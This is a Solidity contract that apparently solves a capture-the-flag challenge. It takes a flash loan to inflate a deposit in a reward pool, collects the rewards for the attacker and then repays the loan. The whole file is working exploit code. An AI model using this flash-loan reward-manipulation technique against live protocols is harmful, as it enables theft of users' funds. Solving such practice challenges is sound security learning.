
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract RewarderExploit {
	FlashLoanerPool public pool;
    TheRewarderPool public rewardsPool;
    IERC20 public liquidityToken;
    address public attacker;
    RewardToken public rewardToken;

	constructor (FlashLoanerPool _pool, TheRewarderPool _rewardsPool, IERC20 _liquidityToken, RewardToken _rewardToken) {
		pool = _pool;
        rewardsPool = _rewardsPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
	}

    function exploit() public {
        attacker = msg.sender; 
        pool.flashLoan(1_000_000 * 10**18);
    }

    function receiveFlashLoan(uint256 amount) public { 
        console.log('receiving flash loan');
        console.log(amount);
        liquidityToken.approve(address(rewardsPool), type(uint256).max);
        rewardsPool.deposit(amount);
        rewardsPool.distributeRewards();
        console.log('rewards received');
        console.log(rewardToken.balanceOf(address(this)));
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
        rewardsPool.withdraw(amount);
        liquidityToken.transfer(address(pool), amount);
    }
}